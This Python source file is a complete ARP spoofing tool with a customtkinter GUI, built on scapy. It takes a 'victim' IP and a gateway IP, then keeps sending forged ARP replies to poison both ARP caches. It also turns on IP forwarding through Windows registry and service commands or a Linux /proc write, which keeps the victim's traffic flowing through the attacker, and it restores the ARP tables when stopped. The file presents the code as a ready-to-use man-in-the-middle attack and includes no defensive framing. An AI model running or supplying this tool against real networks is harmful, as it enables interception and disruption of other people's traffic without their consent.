import customtkinter as ctk
import scapy.all as scapy
import threading
import time
import os
from typing import Optional

class ScapyWrapper:
    def __init__(self):
        self.sent_packets_count = 0
        
    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for given IP."""
        try:
            # Validate IP address format
            import socket
            socket.inet_aton(ip)  # This will raise an exception for invalid IPs
            
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            print(f"Error getting MAC address for {ip}: {e}")
            return None
            
    def send_arp_packet(self, target_ip: str, spoof_ip: str, target_mac: str):
        """Send ARP packet to target."""
        try:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
            self.sent_packets_count += 1
        except Exception as e:
            print(f"Error sending ARP packet to {target_ip}: {e}")
        
    def restore_arp(self, destination_ip: str, source_ip: str):
        """Restore ARP tables to normal state."""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                          psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

class StatusLogger:
    def __init__(self):
        self.messages = []
        
    def log(self, message: str):
        """Log a message."""
        self.messages.append(f"[{time.strftime('%H:%M:%S')}] {message}")
        
    def clear(self):
        """Clear all logged messages."""
        self.messages.clear()

class NetworkManager:
    def __init__(self):
        self.scapy_wrapper = ScapyWrapper()
        self.target_ip = ""
        self.gateway_ip = ""
        self.spoofing_active = False
        
    def start_spoofing(self, target_ip: str, gateway_ip: str):
        """Start ARP spoofing attack."""
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing_active = True
        
        # Try to enable IP forwarding but continue if it fails
        try:
            if os.name == 'nt':  # Windows
                # Enable IP forwarding in registry
                os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
                
                # Try to start and configure the Remote Access service
                os.system("sc config RemoteAccess start= auto")
                os.system("net start RemoteAccess")
            else:  # Linux
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except Exception as e:
            print(f"Warning: Could not enable IP forwarding: {e}")
            print("The victim's internet access will be disrupted.")
        
        target_mac = self.scapy_wrapper.get_mac(target_ip)
        if not target_mac:
            raise ValueError(f"Could not get MAC address for target {target_ip}")
            
        threading.Thread(target=self._spoof_loop, args=(target_ip, gateway_ip, target_mac)).start()
        
    def _spoof_loop(self, target_ip: str, gateway_ip: str, target_mac: str):
        """Main spoofing loop."""
        gateway_mac = self.scapy_wrapper.get_mac(gateway_ip)
        if not gateway_mac:
            print(f"Warning: Could not get MAC address for gateway {gateway_ip}")
            print("ARP spoofing may not work correctly.")
        
        while self.spoofing_active:
            try:
                # Send ARP packets to both target and gateway
                self.scapy_wrapper.send_arp_packet(target_ip, gateway_ip, target_mac)
                if gateway_mac:
                    self.scapy_wrapper.send_arp_packet(gateway_ip, target_ip, gateway_mac)
                time.sleep(2)
            except Exception as e:
                print(f"Error in spoofing loop: {e}")
                time.sleep(2)  # Continue trying
            
    def stop_spoofing(self):
        """Stop ARP spoofing attack and restore ARP tables."""
        if self.spoofing_active:
            self.spoofing_active = False
            
            # Disable IP forwarding
            if os.name == 'nt':  # Windows
                os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
                # Restart routing service
                os.system("net stop RemoteAccess & net start RemoteAccess")
            else:  # Linux
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            
            # Restore ARP tables automatically when stopping
            try:
                self.scapy_wrapper.restore_arp(self.target_ip, self.gateway_ip)
                self.scapy_wrapper.restore_arp(self.gateway_ip, self.target_ip)
            except Exception as e:
                print(f"Error restoring ARP tables: {str(e)}")

class GUIController:
    def __init__(self, app):
        self.app = app
        self.status_logger = StatusLogger()
        self.setup_gui()
        
    def setup_gui(self):
        """Setup GUI elements."""
        # Input Frame
        input_frame = ctk.CTkFrame(self.app.root)
        input_frame.pack(padx=10, pady=10, fill="both", expand=True)
        
        ctk.CTkLabel(input_frame, text="Victim IP:").grid(row=0, column=0, padx=5, pady=5)
        self.victim_entry = ctk.CTkEntry(input_frame, placeholder_text="e.g., 192.168.1.100")
        self.victim_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ctk.CTkLabel(input_frame, text="Gateway IP:").grid(row=1, column=0, padx=5, pady=5)
        self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="e.g., 192.168.1.1")
        self.gateway_entry.grid(row=1, column=1, padx=5, pady=5)
        
        # Add note about admin privileges
        admin_note = "Note: For full functionality (to maintain victim's internet access), run as administrator."
        ctk.CTkLabel(input_frame, text=admin_note, wraplength=350, 
                   text_color="gray", font=("Helvetica", 9)).grid(row=2, column=0, columnspan=2, padx=5, pady=5)
        
        # Control Frame
        control_frame = ctk.CTkFrame(self.app.root)
        control_frame.pack(padx=10, pady=5)
        
        self.start_button = ctk.CTkButton(control_frame, text="Start Spoofing",
                                     command=self.start_spoofing)
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ctk.CTkButton(control_frame, text="Stop Spoofing",
                                    command=self.stop_spoofing)
        self.stop_button.grid(row=0, column=1, padx=5)
        
        # Status Frame
        status_frame = ctk.CTkFrame(self.app.root)
        status_frame.pack(padx=10, pady=5, fill="both", expand=True)
        
        self.status_text = ctk.CTkTextbox(status_frame, height=10, width=50)
        self.status_text.pack(padx=5, pady=5, fill="both", expand=True)
        
        
        
    def start_spoofing(self):
        """Handle start spoofing button click."""
        try:
            victim_ip = self.victim_entry.get()
            gateway_ip = self.gateway_entry.get()
            
            if not victim_ip or not gateway_ip:
                raise ValueError("Please enter both IPs")
                
            self.app.network_manager.start_spoofing(victim_ip, gateway_ip)
            self.update_status("ARP spoofing started...")
        except Exception as e:
            self.update_status(f"Error: {str(e)}")
            
    def stop_spoofing(self):
        """Handle stop spoofing button click."""
        self.app.network_manager.stop_spoofing()
        self.update_status("ARP spoofing stopped and ARP tables restored.")
        
    def update_status(self, message):
        """Update status text."""
        self.status_logger.log(message)
        self.status_text.configure(state="normal")
        self.status_text.delete("1.0", "end")
        for msg in self.status_logger.messages[-10:]:
            self.status_text.insert("end", f"{msg}\n")
        self.status_text.configure(state="disabled")

class ARP_SpoofingApp:
    def __init__(self, root=None):
        # Allow passing an external root window
        if root is None:
            self.root = ctk.CTk()
            self.root.title("ARP Spoofing Tool")
        else:
            self.root = root
            
        self.network_manager = NetworkManager()
        
    def setup_gui(self):
        """Setup main application window."""
        if isinstance(self.root, ctk.CTk):  # Only set geometry if it's our own window
            self.root.geometry("500x400")
        self.gui_controller = GUIController(self)
        
    def run(self):
        """Run the application."""
        self.setup_gui()
        if isinstance(self.root, ctk.CTk):  # Only call mainloop if it's our own window
            self.root.mainloop()

if __name__ == "__main__":
    app = ARP_SpoofingApp()
    app.run()